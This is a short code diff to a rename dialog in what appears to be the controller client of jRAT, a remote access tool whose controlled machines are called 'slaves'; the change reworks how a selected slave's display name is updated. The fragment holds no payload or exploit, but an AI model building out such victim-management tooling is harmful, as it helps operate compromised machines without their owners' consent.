@@ -15,8 +15,8 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.AbstractSlave;
+import se.jrat.client.Main;
 import se.jrat.client.settings.CustomID;
-import se.jrat.client.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -56,13 +56,15 @@ public class FrameRename extends BaseFrame {
 		btnRename.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				CustomID.getGlobal().add(txtNewID.getText(), sl.getID(), sl.getRawIP());
-				for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
-					AbstractSlave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
-					if (sla != null && sla.equals(sl)) {
-						Frame.mainModel.setValueAt(txtNewID.getText(), i, 1);
+				for (AbstractSlave slave : Main.instance.getPanelClients().getSelectedSlaves()) {
+
+					if (slave != null && slave.equals(sl)) {
+						slave.setRenamedID(txtNewID.getText());
 						break;
 					}
 				}
+				
+				Main.instance.repaint();
 				setVisible(false);
 				dispose();
 			}
